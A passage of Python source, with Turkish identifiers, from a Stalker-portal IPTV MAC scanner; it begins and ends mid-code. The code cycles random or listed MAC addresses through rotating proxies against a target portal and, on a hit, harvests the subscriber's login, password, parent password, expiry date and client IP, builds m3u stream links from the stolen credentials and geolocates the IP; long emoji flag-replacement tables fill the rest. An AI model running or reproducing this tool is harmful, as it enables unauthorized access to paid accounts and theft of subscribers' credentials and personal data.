	    	url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: 5.5.0; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG254&image_version=218&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature='+SINGENC+'&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=7c431b0aec69b2f0194c0680c32fe4e3&timestamp='+str(times)+'&api_signature=263&metrics={\\\"mac\\\":\\\"'+macs+'\\\",\\\"sn\\\":\\\"'+SNCUT+'\\\",\\\"model\\\":\\\"MAG254\\\",\\\"type\\\":\\\"STB\\\",\\\"uid\\\":\\\"'+DEVENC+'\\\",\\\"random\\\":\\\"'+random+'\\\"}&JsHttpRequest=1-xml'
	    if stalker_portal=="1":
	    	url22=http+"://"+panel+"/"+uzmanm+'?action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566'
	    	
	    	
	if realblue=="real" or uzmanm=="c/portal.php":
		url22=http+"://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
	return url22
def XD():
	global m3uvpn,m3uon,macon,macvpn,bot,hit,tokenr,hitr,respons,color
	bot=bot+1
	for feyzo in range(combouz):
		if comboc=="feyzo":
			mac=randommac()
			mac=mac.upper()
		else:
			macv=re.search(pattern,combogetir(),re.IGNORECASE)
			if macv:
				mac=macv.group()
				mac=mac.upper()
			else:
				continue
		url=http+"://"+panel+"/"+uzmanm+"?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml"
		ses=requests.Session()
		prox=proxygetir()
		oran=round(((combosay)/(combouz)*100),2)
		#echok(mac,bot,combosay,hit,oran)
		#print(url)
		while True:
			try:
				res=ses.get(url,headers=hea1(panel,mac),proxies=prox,timeout=(3))
				echok(mac,bot,combosay,hit,res.status_code,oran)
			
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		#print(veri)
		random=""
		if not 'token":"' in veri:
			tokenr="\33[35m"
			ses.close
			res.close
			continue
		tokenr="\33[0m"
		token=duzelt1(veri,"token")
		if 'random' in veri:
			random=duzelt1(veri,"random")
		veri=""
		while True:
			try:
				res=ses.get(url2(mac,random),headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		#print(veri)
		id="null"
		ip=""
		login=""
		parent_password=""
		password=""
		stb_type=""
		tariff_plan_id=""
		comment=""
		country=""
		settings_password=""
		expire_billing_date=""
		max_online=""
		expires=""
		ls=""
		try:
			id=veri.split('{"js":{"id":')[1]
			id=str(id.split(',"name')[0])
		except:pass
		
		try:
				ip=str(duzel2(veri,"ip"))
		except:pass
		try:
			expires=str(duzel2(veri,"expires"))
		except:pass
		if id=="null" and expires=="" and ban=="":
			continue
			ses.close
			res.close
		if uzmanm=="stalker_portal/server/load.php":
			if 'login":"' in veri:
				login=str(duzel2(veri,"login"))
				parent_password=str(duzel2(veri,"parent_password"))
				password=str(duzel2(veri,"password"))
				stb_type=str(duzel2(veri,"stb_type"))
				tariff_plan_id=str(duzel2(veri,"tariff_plan_id"))
				comment=str(duzel2(veri,"comment"))
				country=str(duzel2(veri,"country"))
				settings_password=str(duzel2(veri,"settings_password"))
				expire_billing_date=str(duzel2(veri,"expire_billing_date"))
				ls=str(duzel2(veri,"ls"))
				try:
					max_online=str(duzel2(veri,"max_online"))
				except:pass
		#print(veri)
		url=http+"://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
		
		veri=""
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		#print(veri)
	#	quit()
		if veri.count('phone')==0 and veri.count('end_date')==0 and expires=="" and expire_billing_date=="":
			continue
			ses.close
			res.close
		fname=""
		tariff_plan=""
		ls=""
		trh=""
		bill=""
		if uzmanm=="stalker_portal/server/load.php":
			try:
				fname=str(duzel2(veri,"fname"))
			except:pass
			try:
			    tariff_plan=str(duzel2(veri,"tariff_plan"))
			except:pass
			try:
			    bill=str(duzel2(veri,"created"))
			except:pass
		if "phone" in veri:
			trh=str(duzel2(veri,"phone"))
		if "end_date" in veri:
			trh=str(duzel2(veri,"end_date"))
		if trh=="":
			if not expires=="":
				trh=expires
		try:
			trh=(datetime.datetime.fromtimestamp(int(trh)).strftime('%d-%m-%Y %H:%M:%S'))
		except:pass
		if '(-' in trh:
			continue
			option.close
			res.close
		
		if trh.lower()[:2] =='un':
			KalanGun=(" Days")
		else:
			try:
			   KalanGun=(str(tarih_clear(trh))+" Days")
			   if tarih_clear(trh) < expdate:
			     macexp=+1
			     continue
			     option.close()
			     res.close()
			     
			   #trh=trh+' '+ KalanGun
			   trh=f"{trh} {KalanGun}"
			except Exception:pass
		if trh=="":
			if uzmanm=="stalker_portal/server/load.php":
				trh=expire_billing_date
		veri=""
		cid="1842"
		url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
		bad=0
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
				veri=str(res.text)
				if 'total' in veri:
					cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				if uzmanm=="stalker_portal/server/load.php":
				     cid=(str(res.text).split('id":"')[5].split('"')[0])
				break
			except:pass
		user=""
		pas=""
		link=""
		m3ulink=""
		m3uhost=""
		real=panel
		if not expires=="":
			veri=""
			cmd=""
			url=http+"://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if not 'cmd' in veri:
				continue
			cmd=duzel2(veri,'cmd')
			
			veri=""
			url=http+"://"+panel+"/"+uzmanm+"?type=vod&action=create_link&cmd="+str(cmd)+"&series=&forced_storage=&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if 'cmd":"' in veri:
				link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
				user=str(link.replace('movie/','').split('/')[3])
				real=http+"://"+link.split('://')[1].split('/')[0]+'/c/'
				pas=str(link.replace('movie/','').split('/')[4])
				cid=duzel2(veri,'id')
				m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
				m3uhost="http://"+ panel.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
				
		hitecho(mac,trh)
		hit=hit+1
		hitr="\33[1;36m"
		veri=""
		if user=="":
			while True:
				try:
					res = ses.get(url7(cid), headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
					veri=str(res.text)
					if 'ffmpeg ' in veri:
					     link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
					else:
					     if 'cmd":"' in veri:
					     	link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
					     	user=login
					     	pas=password
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					if 'ffmpeg ' in veri:
					     user=str(link.replace('live/','').split('/')[3])
					     pas=str(link.replace('live/','').split('/')[4])
					     if real==panel:
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
					m3uhost="http://"+ panel.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
				
					break
				except:pass
		durum=""
		if not link=="":
			try:
				durum=goruntu(link,cid)
			except:pass
		if not m3ulink=="":
			playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			plink=real.replace('http://','').replace('/c/','')
			playerapi=m3uapi(playerlink,mac,token)
			m3uimage=m3ugoruntu(cid,user,pas,plink)
			if playerapi=="":
			    playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			    plink=panel.replace('http://','').replace('/c/','')
			    playerapi=m3uapi(playerlink,mac,token)
			    m3uimage=m3ugoruntu(cid,user,pas,plink)
		if m3uimage=="ⓃⓄ ⒾⓂ︎ⒶⒼⒺ 📛":
			m3uvpn=m3uvpn+1
		else:
			m3uon=m3uon+1
		if durum=="𝙑𝙋𝙉「 𝙇𝙊𝘾𝙆𝙀𝘿 」🔒 🔴" or durum=="Invalid Opps" or durum=="  ":
			macvpn=macvpn+1
		else:
			macon=macon+1
		vpn=""
		if not ip =="":
			vpn=vpnip(ip)
		else:
			vpn="No Client IP"

		pal=""
		url5="http://ipleak.net/json/"+ip
		while True:
    		 try:
        		 res = ses.get(url5, timeout=7, verify=False)
        		 break
    		 except:
        		 bag1=bag1+1
        		 time.sleep(bekleme)
        		 if bag1==4:
            		  break
		            	
		try:
		       bag1=0
		       veri=str(res.text)
		       scountry=""
		       country_name="Unavailable 🏴‍☠️"
		       scountry=veri.split('country_code": "')[1]
		       scountry=scountry.split('"')[0]
		       country_name=veri.split('country_name": "')[1]
		       country_name=country_name.split('"')[0]
		       if country_name=="":
		        country_name="Unavailable 🏴‍☠️"
		except:pass	
		
		kanalsayisi=""
		filmsayisi=""
		dizisayisi=""
		livelist=""
		vodlist=""
		serieslist=""

		urlksay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
		res = ses.get(urlksay,timeout=15, verify=False)
		veri=str(res.text)
		kanalsayisi=str(veri.count("stream_id"))

		urlfsay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
		res = ses.get(urlfsay, timeout=15, verify=False)
		veri=str(res.text)
		filmsayisi=str(veri.count("stream_id"))

		urldsay="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
		res = ses.get(urldsay,  timeout=15, verify=False)
		veri=str(res.text)
		dizisayisi=str(veri.count("series_id"))

		liveurl=http+"://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
		if not expires=="":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml" 
		if uzmanm=="stalker_portal/server/load.php":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
		vodurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
		seriesurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
		if kanalkata=="1" or kanalkata=="2":
			listlink=liveurl
			livel='⍟'
			livelist=list(listlink,mac,token,livel)
			livelist=livelist.upper()
			livelist=livelist.replace("«»","")
			livelist=livelist.replace("⍟ADU"," |🔞 ADULTS")
			livelist=livelist.replace("⍟FO"," |🔞 FOR")
			livelist=livelist.replace("⍟BLU"," |🔞 BLU")
			livelist=livelist.replace("⍟XXX"," |🔞 XXX")
			livelist=livelist.replace("⍟AE"," |🇦🇪 AE")
			livelist=livelist.replace("⍟UAE"," |🇦🇪 UAE")
			livelist=livelist.replace("⍟ALL"," |🏁ALL")
			livelist=livelist.replace("⍟ALB"," |🇦🇱 ALB")
			livelist=livelist.replace("⍟AR"," |🇸🇦 AR")
			livelist=livelist.replace("⍟AT"," |🇦🇹 AT")
			livelist=livelist.replace("⍟AU"," |🇦🇺 AU")
			livelist=livelist.replace("⍟AZ"," |🇦🇿 AZ")
			livelist=livelist.replace("⍟BE"," |🇧🇪 BE")
			livelist=livelist.replace("⍟BG"," |🇧🇬 BG")
			livelist=livelist.replace("⍟BIH"," |🇧🇦 BIH")
			livelist=livelist.replace("⍟BO"," |🇧🇴 BO")
			livelist=livelist.replace("⍟BR"," |🇧🇷 BR")
			livelist=livelist.replace("⍟CA"," |🇨🇦 CA")
			livelist=livelist.replace("⍟CH"," |🇨🇭 CH")
			livelist=livelist.replace("⍟SW"," |🇨🇭 SW")
			livelist=livelist.replace("⍟CL"," |🇨🇱 CL")
			livelist=livelist.replace("⍟CN"," |🇨🇳 CN")
			livelist=livelist.replace("⍟CO"," |🇨🇴 CO")
			livelist=livelist.replace("⍟CR"," |🇭🇷 CR")
			livelist=livelist.replace("⍟CZ"," |🇨🇿 CZ")
			livelist=livelist.replace("⍟DE"," |🇩🇪 DE")
			livelist=livelist.replace("⍟De"," |🇩🇪 De")
			livelist=livelist.replace("⍟GE"," |🇩🇪 GE")
			livelist=livelist.replace("⍟DK"," |🇩🇰 DK")
			livelist=livelist.replace("⍟DM"," |🇩🇰 DM")
			livelist=livelist.replace("⍟EC"," |🇪🇨 EC")
			livelist=livelist.replace("⍟EG"," |🇪🇬 EG")
			livelist=livelist.replace("⍟EN"," |🇬🇧 EN")
			livelist=livelist.replace("⍟GB"," |🇬🇧 GB")
			livelist=livelist.replace("⍟UK"," |🇬🇧 UK")
			livelist=livelist.replace("⍟EU"," |🇪🇺 EU")
			livelist=livelist.replace("⍟ES"," |🇪🇸 ES")
			livelist=livelist.replace("⍟SP"," |🇪🇸 SP")
			livelist=livelist.replace("⍟EX"," |🇭🇷 EX")
			livelist=livelist.replace("⍟YU"," |🇭🇷 YU")
			livelist=livelist.replace("⍟FI"," |🇫🇮 FI")
			livelist=livelist.replace("⍟FR"," |🇫🇷 FR")
			livelist=livelist.replace("⍟FI"," |🇫🇮 FI")
			livelist=livelist.replace("⍟GOR"," |🇲🇪 GOR")
			livelist=livelist.replace("⍟GR"," |🇬🇷 GR")
			livelist=livelist.replace("⍟HR"," |🇭🇷 HR")
			livelist=livelist.replace("⍟HU"," |🇭🇺 HU")
			livelist=livelist.replace("⍟IE"," |🇮🇪 IE")
			livelist=livelist.replace("⍟IL"," |🇮🇪 IL")
			livelist=livelist.replace("⍟IR"," |🇮🇪 IR")
			livelist=livelist.replace("⍟ID"," |🇮🇩 ID")
			livelist=livelist.replace("⍟IN"," |🇮🇳 IN")
			livelist=livelist.replace("⍟IT"," |🇮🇹 IT")
			livelist=livelist.replace("⍟JP"," |🇯🇵 JP")
			livelist=livelist.replace("⍟KE"," |🇰🇪 KE")
			livelist=livelist.replace("⍟KU"," |🇭🇺 KU")
			livelist=livelist.replace("⍟KR"," |🇰🇷 KR")
			livelist=livelist.replace("⍟LU"," |🇱🇺 LU")
			livelist=livelist.replace("⍟MKD"," |🇲🇰 MKD")
			livelist=livelist.replace("⍟MX"," |🇲🇽 MX")
			livelist=livelist.replace("⍟MY"," |🇲🇾 MY")
			livelist=livelist.replace("⍟NETFLIX"," | 🚩 NETFLIX")
			livelist=livelist.replace("⍟NG"," |🇳🇬 NG")
			livelist=livelist.replace("⍟NZ"," |🇳🇿 NZ")
			livelist=livelist.replace("⍟NL"," |🇳🇱 NL")
			livelist=livelist.replace("⍟NO"," |🇳🇴 NO")
			livelist=livelist.replace("⍟PA"," |🇵🇦 PA")
			livelist=livelist.replace("⍟PE"," |🇵🇪 PE")
			livelist=livelist.replace("⍟PH"," |🇵🇭 PH")
			livelist=livelist.replace("⍟PK"," |🇵🇰 PK")
			livelist=livelist.replace("⍟PL"," |🇵🇱 PL")
			livelist=livelist.replace("⍟PT"," |🇵🇹 PT")
			livelist=livelist.replace("⍟PPV"," |🏋🏼‍♂️ PPV")
			livelist=livelist.replace("⍟QA"," |🇶🇦 QA")
			livelist=livelist.replace("⍟RO"," |🇷🇴 RO")
			livelist=livelist.replace("⍟RU"," |🇷🇺 RU")
			livelist=livelist.replace("⍟SA"," |🇸🇦 SA")
			livelist=livelist.replace("⍟SCREENSAVER"," | 🏞 SCREENSAVER")
			livelist=livelist.replace("⍟SE"," |🇸🇪 SE")
			livelist=livelist.replace("⍟SK"," |🇸🇰 SK")
			livelist=livelist.replace("⍟SL"," |🇸🇮 SL")
			livelist=livelist.replace("⍟SG"," |🇸🇬 SG")
			livelist=livelist.replace("⍟SR"," |🇷🇸 SR")
			livelist=livelist.replace("⍟SU"," |🇦🇲 SU")
			livelist=livelist.replace("⍟TH"," |🇹🇭 TH")
			livelist=livelist.replace("⍟TR"," |🇹🇷 TR")
			livelist=livelist.replace("⍟TW"," |🇹🇼 TW")
			livelist=livelist.replace("⍟UKR"," |🇺🇦 UKR")
			livelist=livelist.replace("⍟US"," |🇺🇸 US")
			livelist=livelist.replace("⍟VN"," |🇻🇳 VN")
			livelist=livelist.replace("⍟VIP"," | ⚽️ VIP")
			livelist=livelist.replace("⍟WEB"," |🔞 WEB")
			livelist=livelist.replace("⍟ZA"," |🇿🇦 ZA")
			livelist=livelist.replace("⍟AF"," |🇿🇦 AF")
			livelist=livelist.replace("⍟"," |®️ ")
			
		if kanalkata=="2":
			listlink=vodurl
			livel='⍟'
			vodlist=list(listlink,mac,token,livel)
			vodlist=vodlist.upper()
			vodlist=vodlist.replace("«»","")
			vodlist=vodlist.replace("⍟ADU"," |🔞 ADULTS")
			vodlist=vodlist.replace("⍟FO"," |🔞 FOR")
			vodlist=vodlist.replace("⍟BLU"," |🔞 BLU")
			vodlist=vodlist.replace("⍟XXX"," |🔞 XXX")
			vodlist=vodlist.replace("⍟AE"," |🇦🇪 AE")
			vodlist=vodlist.replace("⍟UAE"," |🇦🇪 UAE")
			vodlist=vodlist.replace("⍟ALL"," |🏁ALL")
			vodlist=vodlist.replace("⍟ALB"," |🇦🇱 ALB")
			vodlist=vodlist.replace("⍟AR"," |🇸🇦 AR")
			vodlist=vodlist.replace("⍟AT"," |🇦🇹 AT")
			vodlist=vodlist.replace("⍟AU"," |🇦🇺 AU")
			vodlist=vodlist.replace("⍟AZ"," |🇦🇿 AZ")
			vodlist=vodlist.replace("⍟BE"," |🇧🇪 BE")
			vodlist=vodlist.replace("⍟BG"," |🇧🇬 BG")
			vodlist=vodlist.replace("⍟BIH"," |🇧🇦 BIH")
			vodlist=vodlist.replace("⍟BO"," |🇧🇴 BO")
			vodlist=vodlist.replace("⍟BR"," |🇧🇷 BR")
			vodlist=vodlist.replace("⍟CA"," |🇨🇦 CA")
			vodlist=vodlist.replace("⍟CH"," |🇨🇭 CH")
			vodlist=vodlist.replace("⍟SW"," |🇨🇭 SW")
			vodlist=vodlist.replace("⍟CL"," |🇨🇱 CL")
			vodlist=vodlist.replace("⍟CN"," |🇨🇳 CN")
			vodlist=vodlist.replace("⍟CO"," |🇨🇴 CO")
			vodlist=vodlist.replace("⍟CR"," |🇭🇷 CR")
			vodlist=vodlist.replace("⍟CZ"," |🇨🇿 CZ")
			vodlist=vodlist.replace("⍟DE"," |🇩🇪 DE")
			vodlist=vodlist.replace("⍟De"," |🇩🇪 De")
			vodlist=vodlist.replace("⍟GE"," |🇩🇪 GE")
			vodlist=vodlist.replace("⍟DK"," |🇩🇰 DK")
			vodlist=vodlist.replace("⍟DM"," |🇩🇰 DM")
			vodlist=vodlist.replace("⍟EC"," |🇪🇨 EC")
			vodlist=vodlist.replace("⍟EG"," |🇪🇬 EG")
			vodlist=vodlist.replace("⍟EN"," |🇬🇧 EN")
			vodlist=vodlist.replace("⍟GB"," |🇬🇧 GB")
			vodlist=vodlist.replace("⍟UK"," |🇬🇧 UK")
			vodlist=vodlist.replace("⍟EU"," |🇪🇺 EU")
			vodlist=vodlist.replace("⍟ES"," |🇪🇸 ES")
			vodlist=vodlist.replace("⍟SP"," |🇪🇸 SP")
			vodlist=vodlist.replace("⍟EX"," |🇭🇷 EX")
			vodlist=vodlist.replace("⍟YU"," |🇭🇷 YU")
			vodlist=vodlist.replace("⍟FI"," |🇫🇮 FI")
			vodlist=vodlist.replace("⍟FR"," |🇫🇷 FR")
			vodlist=vodlist.replace("⍟FI"," |🇫🇮 FI")
			vodlist=vodlist.replace("⍟GOR"," |🇲🇪 GOR")
			vodlist=vodlist.replace("⍟GR"," |🇬🇷 GR")
			vodlist=vodlist.replace("⍟HR"," |🇭🇷 HR")
			vodlist=vodlist.replace("⍟HU"," |🇭🇺 HU")
			vodlist=vodlist.replace("⍟IE"," |🇮🇪 IE")
			vodlist=vodlist.replace("⍟IL"," |🇮🇪 IL")
			vodlist=vodlist.replace("⍟IR"," |🇮🇪 IR")
			vodlist=vodlist.replace("⍟ID"," |🇮🇩 ID")
			vodlist=vodlist.replace("⍟IN"," |🇮🇳 IN")
			vodlist=vodlist.replace("⍟IT"," |🇮🇹 IT")
			vodlist=vodlist.replace("⍟JP"," |🇯🇵 JP")
			vodlist=vodlist.replace("⍟KE"," |🇰🇪 KE")
			vodlist=vodlist.replace("⍟KU"," |🇭🇺 KU")
			vodlist=vodlist.replace("⍟KR"," |🇰🇷 KR")
			vodlist=vodlist.replace("⍟LU"," |🇱🇺 LU")
			vodlist=vodlist.replace("⍟MKD"," |🇲🇰 MKD")
			vodlist=vodlist.replace("⍟MX"," |🇲🇽 MX")
			vodlist=vodlist.replace("⍟MY"," |🇲🇾 MY")
			vodlist=vodlist.replace("⍟NETFLIX"," | 🚩 NETFLIX")
			vodlist=vodlist.replace("⍟NG"," |🇳🇬 NG")
			vodlist=vodlist.replace("⍟NZ"," |🇳🇿 NZ")
			vodlist=vodlist.replace("⍟NL"," |🇳🇱 NL")
			vodlist=vodlist.replace("⍟NO"," |🇳🇴 NO")
			vodlist=vodlist.replace("⍟PA"," |🇵🇦 PA")
			vodlist=vodlist.replace("⍟PE"," |🇵🇪 PE")
			vodlist=vodlist.replace("⍟PH"," |🇵🇭 PH")
			vodlist=vodlist.replace("⍟PK"," |🇵🇰 PK")
			vodlist=vodlist.replace("⍟PL"," |🇵🇱 PL")
			vodlist=vodlist.replace("⍟PT"," |🇵🇹 PT")
			vodlist=vodlist.replace("⍟PPV"," |🏋🏼‍♂️ PPV")
			vodlist=vodlist.replace("⍟QA"," |🇶🇦 QA")
			vodlist=vodlist.replace("⍟RO"," |🇷🇴 RO")
			vodlist=vodlist.replace("⍟RU"," |🇷🇺 RU")
			vodlist=vodlist.replace("⍟SA"," |🇸🇦 SA")
			vodlist=vodlist.replace("⍟SCREENSAVER"," | 🏞 SCREENSAVER")
			vodlist=vodlist.replace("⍟SE"," |🇸🇪 SE")
			vodlist=vodlist.replace("⍟SK"," |🇸🇰 SK")
			vodlist=vodlist.replace("⍟SL"," |🇸🇮 SL")
			vodlist=vodlist.replace("⍟SG"," |🇸🇬 SG")
			vodlist=vodlist.replace("⍟SR"," |🇷🇸 SR")
			vodlist=vodlist.replace("⍟SU"," |🇦🇲 SU")
			vodlist=vodlist.replace("⍟TH"," |🇹🇭 TH")
			vodlist=vodlist.replace("⍟TR"," |🇹🇷 TR")
			vodlist=vodlist.replace("⍟TW"," |🇹🇼 TW")
			vodlist=vodlist.replace("⍟UKR"," |🇺🇦 UKR")
			vodlist=vodlist.replace("⍟US"," |🇺🇸 US")
			vodlist=vodlist.replace("⍟VN"," |🇻🇳 VN")
			vodlist=vodlist.replace("⍟VIP"," | ⚽️ VIP")
			vodlist=vodlist.replace("⍟WEB"," |🔞 WEB")
			vodlist=vodlist.replace("⍟ZA"," |🇿🇦 ZA")
			vodlist=vodlist.replace("⍟AF"," |🇿🇦 AF")
			vodlist=vodlist.replace("⍟"," |®️ ")
			
			listlink=seriesurl
			livel='⍟'
			serieslist=list(listlink,mac,token,livel)
			serieslist=serieslist.upper()
			serieslist=serieslist.replace("«»","")
			serieslist=serieslist.replace("⍟ADU"," |🔞 ADULTS")
			serieslist=serieslist.replace("⍟FO"," |🔞 FOR")
			serieslist=serieslist.replace("⍟BLU"," |🔞 BLU")
			serieslist=serieslist.replace("⍟XXX"," |🔞 XXX")
			serieslist=serieslist.replace("⍟AE"," |🇦🇪 AE")
			serieslist=serieslist.replace("⍟UAE"," |🇦🇪 UAE")
			serieslist=serieslist.replace("⍟ALL"," |🏁ALL")
			serieslist=serieslist.replace("⍟ALB"," |🇦🇱 ALB")
			serieslist=serieslist.replace("⍟AR"," |🇸🇦 AR")
			serieslist=serieslist.replace("⍟AT"," |🇦🇹 AT")
			serieslist=serieslist.replace("⍟AU"," |🇦🇺 AU")
			serieslist=serieslist.replace("⍟AZ"," |🇦🇿 AZ")
			serieslist=serieslist.replace("⍟BE"," |🇧🇪 BE")
			serieslist=serieslist.replace("⍟BG"," |🇧🇬 BG")
			serieslist=serieslist.replace("⍟BIH"," |🇧🇦 BIH")
			serieslist=serieslist.replace("⍟BO"," |🇧🇴 BO")
			serieslist=serieslist.replace("⍟BR"," |🇧🇷 BR")
			serieslist=serieslist.replace("⍟CA"," |🇨🇦 CA")
			serieslist=serieslist.replace("⍟CH"," |🇨🇭 CH")
			serieslist=serieslist.replace("⍟SW"," |🇨🇭 SW")
			serieslist=serieslist.replace("⍟CL"," |🇨🇱 CL")
			serieslist=serieslist.replace("⍟CN"," |🇨🇳 CN")
			serieslist=serieslist.replace("⍟CO"," |🇨🇴 CO")
			serieslist=serieslist.replace("⍟CR"," |🇭🇷 CR")
			serieslist=serieslist.replace("⍟CZ"," |🇨🇿 CZ")
			serieslist=serieslist.replace("⍟DE"," |🇩🇪 DE")
			serieslist=serieslist.replace("⍟De"," |🇩🇪 De")
			serieslist=serieslist.replace("⍟GE"," |🇩🇪 GE")
			serieslist=serieslist.replace("⍟DK"," |🇩🇰 DK")
			serieslist=serieslist.replace("⍟DM"," |🇩🇰 DM")
			serieslist=serieslist.replace("⍟EC"," |🇪🇨 EC")
			serieslist=serieslist.replace("⍟EG"," |🇪🇬 EG")
			serieslist=serieslist.replace("⍟EN"," |🇬🇧 EN")
			serieslist=serieslist.replace("⍟GB"," |🇬🇧 GB")
			serieslist=serieslist.replace("⍟UK"," |🇬🇧 UK")
			serieslist=serieslist.replace("⍟EU"," |🇪?? EU")
			serieslist=serieslist.replace("⍟ES"," |🇪🇸 ES")
			serieslist=serieslist.replace("⍟SP"," |🇪🇸 SP")
			serieslist=serieslist.replace("⍟EX"," |🇭🇷 EX")
			serieslist=serieslist.replace("⍟YU"," |🇭🇷 YU")
			serieslist=serieslist.replace("⍟FI"," |🇫🇮 FI")
			serieslist=serieslist.replace("⍟FR"," |🇫🇷 FR")
			serieslist=serieslist.replace("⍟FI"," |🇫🇮 FI")
			serieslist=serieslist.replace("⍟GOR"," |🇲🇪 GOR")
			serieslist=serieslist.replace("⍟GR"," |🇬🇷 GR")
			serieslist=serieslist.replace("⍟HR"," |🇭🇷 HR")
			serieslist=serieslist.replace("⍟HU"," |🇭🇺 HU")
			serieslist=serieslist.replace("⍟IE"," |🇮🇪 IE")
			serieslist=serieslist.replace("⍟IL"," |🇮🇪 IL")
			serieslist=serieslist.replace("⍟IR"," |🇮🇪 IR")
			serieslist=serieslist.replace("⍟ID"," |🇮🇩 ID")
			serieslist=serieslist.replace("⍟IN"," |🇮🇳 IN")
			serieslist=serieslist.replace("⍟IT"," |🇮🇹 IT")
			serieslist=serieslist.replace("⍟JP"," |🇯🇵 JP")
			serieslist=serieslist.replace("⍟KE"," |🇰🇪 KE")
			serieslist=serieslist.replace("⍟KU"," |🇭🇺 KU")
			serieslist=serieslist.replace("⍟KR"," |🇰🇷 KR")
			serieslist=serieslist.replace("⍟LU"," |🇱🇺 LU")
			serieslist=serieslist.replace("⍟MKD"," |🇲🇰 MKD")
			serieslist=serieslist.replace("⍟MX"," |🇲🇽 MX")
			serieslist=serieslist.replace("⍟MY"," |🇲🇾 MY")
			serieslist=serieslist.replace("⍟NETFLIX"," | 🚩 NETFLIX")
			serieslist=serieslist.replace("⍟NG"," |🇳🇬 NG")
			serieslist=serieslist.replace("⍟NZ"," |🇳🇿 NZ")
			serieslist=serieslist.replace("⍟NL"," |🇳🇱 NL")
			serieslist=serieslist.replace("⍟NO"," |🇳🇴 NO")
			serieslist=serieslist.replace("⍟PA"," |🇵🇦 PA")
			serieslist=serieslist.replace("⍟PE"," |🇵🇪 PE")
			serieslist=serieslist.replace("⍟PH"," |🇵🇭 PH")
			serieslist=serieslist.replace("⍟PK"," |🇵🇰 PK")
